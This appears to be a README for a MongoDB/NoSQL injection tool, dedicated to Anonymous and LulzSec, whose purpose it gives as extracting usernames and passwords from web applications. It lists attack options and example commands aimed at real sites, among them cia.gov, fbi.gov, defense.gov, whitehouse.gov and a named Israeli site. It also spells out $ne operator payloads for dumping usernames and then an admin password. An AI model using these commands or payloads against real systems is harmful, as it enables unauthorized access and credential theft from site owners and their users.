# NosqlAimar13

NosqlAimar13 is a penetration-testing tool for Nosql Injection on web applications. 
NosqlAimar13 , however, primarily aims to exploit MongoDB Injection to retrieve data from web applications.
It is not created to download big databases is created to extract usernames and passwords and others dates.


# Installation

pip install requests
pip install colorama


# Usage

python3 NosqlAimar13.py 

8 8888         8 8888      88 8 8888          8888888888',8888'    d888888o.   8 8888888888       ,o888888o.    
8 8888         8 8888      88 8 8888                 ,8',8888'   .`8888:' `88. 8 8888            8888     `88.  
8 8888         8 8888      88 8 8888                ,8',8888'    8.`8888.   Y8 8 8888         ,8 8888       `8. 
8 8888         8 8888      88 8 8888               ,8',8888'     `8.`8888.     8 8888         88 8888           
8 8888         8 8888      88 8 8888              ,8',8888'       `8.`8888.    8 888888888888 88 8888           
8 8888         8 8888      88 8 8888             ,8',8888'         `8.`8888.   8 8888         88 8888           
8 8888         8 8888      88 8 8888            ,8',8888'           `8.`8888.  8 8888         88 8888           
8 8888         ` 8888     ,8P 8 8888           ,8',8888'        8b   `8.`8888. 8 8888         `8 8888       .8' 
8 8888           8888   ,d8P  8 8888          ,8',8888'         `8b.  ;8.`8888 8 8888            8888     ,88'  
8 888888888888    `Y88888P'   8 888888888888 ,8',8888888888888   `Y8888P ,88P' 8 888888888888     `8888888P'    
Created by KʀokeᴛⒶiᴍⒶʀᴛxosoɴᴅO for my Anonymous&&LulzSec friends



# Usage: NosqlAimar13.py -u [url] ...

    -u          Refers to the URL of the target. Includes port and get parameters if you are using get requests.
    --method    Set to either "post" or "get". Default "get"
    --data      Use this option to specify post data
    --file      File containing the parameters instead.

# Flexibility
    --cookies      Cookies to send. Separate different cookies with &
    --headers      Header to send. Separate different headers with ;
    --maxbrute     Default value is 100,  is the maximum number of bruteforce attempts the program will try. Set to 0 for limitless.
    --maxthreads   Default value is 50 ,is the maximum number of concurent threads the program will spawn.
    --csrftoken    Specify the csrftoken to be checked for. You must modify code for this option to work.
    --ignorecheck  Set these when false positives are found. Can be set to the following.

        text --- Ignore website content comparisons. Useful for combatting CSRF.
        status --- Ignore status code comparison
        url --- Ignore redirect URL comparison
        -t  Specify some technique IDs to use.

# Post-Detection
    --dump    Retrieve as much information as possible via detected injection methods,  dump will be used by default.

# Help and Documentation
    -h --help   Help page. Use with -t to display documentation regarding the specified techniques
    -ts --techniques    all techniques.

# Examples
python NosqlAimar13.py -u http://americannaziparty.com?sad=22
python NosqlAimar13.py -u http://landser.com:8080?search=1 -t 324
python NosqlAimar13.py -u http://cia.gov:8090?search=1 -t w
python NosqlAimar13.py -u http://fbi.gov --method post --data "username=hi&password=letmein"
python NosqlAimar13.py -u https://defense.gov:5454?foo=1 --cookies "PHPSESSID=1242345234512345&ID=123"
python NosqlAimar13.py -u http://whitehouse.gov --method post --data search=1 --headers "Host: administrator1.friendzone.red; User-Agent: imlazytotypethis"
python NosqlAimar13.py -u https://www.zbath.co.il:20001/v1/account/login --method json --data {\"username\":\"admin\",\"password\":\"1\"}
python NosqlAimar13.py -u https://www.zbath.co.il:20001/v1/account/login --method json --data {\"username\":{\"$ne\":\"1\"},\"password\":\"1\"}
python NosqlAimar13.py -u https://www.zbath.co.il/wp-json/wp/v2/comments?post=1407 --method json --file params.txt

Let's say you have a username and a password, and you want to extract both usernames and passwords.
# Get the usernames:
python NosqlAimar13.py -u https://www.zbath.co.il/api/login --method json --data {\"username\":\"1\",\"password\":{\"$ne\":\"1\"}} -p username
This should force NosqlAimar13 to dump out all usernames it can extract.

# Find the password for each username: 
python NosqlAimar13.py -u https://www.zbath.co.il/api/login --method json --data {\"username\":\"admin\",\"password\":\"1\"} -p password

Let's say one of the dumped usernames from Step 1 is "admin". Set that as the username, then force the vulnerable parameter to be password.
NosqlAimar13 will attempt to dump the password of admin. 

# Check the full description of each technique I've written to perform MongoDB Injection with this command:
python NosqlAimar13.py -h -t aw

It contains most of my documentation for those techniques. However, the basic payloads involved are:
Parsing in PHP arrays (Instead of username=a, it sends username[$ne]=a, so poorly sanitised MongoDB backends will have a different request)
Injecting WHERE requests by parsing javascript with single or double quote escapes. There's a payload for a simple where check, as well as injecting into Javascript functions.

NosqlAimar13 will now work with json data types for technique 0 and 1, the not equals injection and the regex injection.


